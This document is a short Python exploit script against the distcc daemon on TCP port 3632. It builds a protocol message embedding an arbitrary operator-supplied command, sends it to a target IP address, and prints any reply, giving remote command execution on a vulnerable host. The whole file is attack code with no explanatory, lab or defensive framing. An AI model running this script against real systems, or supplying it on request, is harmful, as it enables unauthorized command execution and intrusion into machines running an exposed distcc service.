#!/usr/bin/env python3
import socket
import sys
import time

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <target_ip> <command>")
    sys.exit(1)

target = sys.argv[1]
command = sys.argv[2]

payload = (
    "DIST00000001"
    "ARGC00000001"
    "ARGV00000001"
    + f"{len(command):08x}"
    + command
    + "DONE00000000"
)

payload = payload.encode()

print(f"[*] connecting to {target}:3632")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target, 3632))

    print(f"[*] sending payload ({len(payload)} bytes)")
    s.sendall(payload)

    time.sleep(1)

    try:
        data = s.recv(4096)
        if data:
            print("[RECV]")
            print(data.decode(errors="ignore"))
        else:
            print("[*] no response before timeout.")
    except:
        print("[*] no response before timeout.")

    s.close()

except Exception as e:
    print(f"Error: {e}")
